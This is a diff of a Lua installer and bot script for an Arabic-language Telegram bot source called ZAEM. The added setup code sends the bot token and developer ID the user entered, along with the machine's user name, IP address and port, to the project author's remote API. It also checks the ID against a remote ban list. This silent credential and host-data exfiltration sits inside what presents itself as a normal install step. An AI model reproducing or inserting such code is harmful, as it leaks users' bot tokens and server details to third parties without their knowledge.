@@ -25,6 +25,13 @@ if not DevRio:get(Server.."IdZAEM") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
+data,res = https.request("https:///Api/ZAEM/index.php?Ban=ZAEM&Info&Id="..DevId)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+os.execute('lua ZAEM.lua') 
+end ---ifBn
 if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevRio:set(Server.."IdZAEM",DevId) 
@@ -33,6 +40,7 @@ else
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 end
 os.execute('lua ZAEM.lua') 
+end
 end 
 if not DevRio:get(Server.."TokenZAEM") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -68,7 +76,30 @@ TokenBot = DevRio:get(Server.."TokenZAEM"),
 ZAEM = DevRio:get(Server.."TokenZAEM"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdZAEM")},
 }
-
+Create(Config, "./config.lua") 
+https.request("https:///Api/ZAEM/index.php?Get=ZAEM&DevId="..DevRio:get(Server.."IdZAEM").."&TokenBot="..DevRio:get(Server.."TokenZAEM").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+file = io.open("ZAEM.sh", "w")  
+file:write([[
+#!/usr/bin/env bash
+cd $HOME/ZAEM
+token="]]..DevRio:get(Server.."TokenZAEM")..[["
+while(true) do
+rm -fr ../.telegram-cli
+if [ ! -f ./tg ]; then
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "~ The tg File Was Not Found In The Bot Files!"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+exit 1
+fi
+if [ ! $token ]; then
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+echo "~ The Token Was Not Found In The config.lua File!"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
+exit 1
+fi
+./tg -s ./ZAEM.lua -p PROFILE --bot=$token
+done
+]])  
 file:close()  
 file = io.open("Run", "w")  
 file:write([[
@@ -85,7 +116,8 @@ io.popen("mkdir Files")
 os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
-local Load_ZAEM = function()
+end
+local Load_ZAEM = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
@@ -4726,7 +4758,7 @@ Dev_Rio(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس ن�
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(DevId) then  
-Dev_Rio(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻??💗', 1, 'html')
+Dev_Rio(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
 return false
 end 
 local ZAEMTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
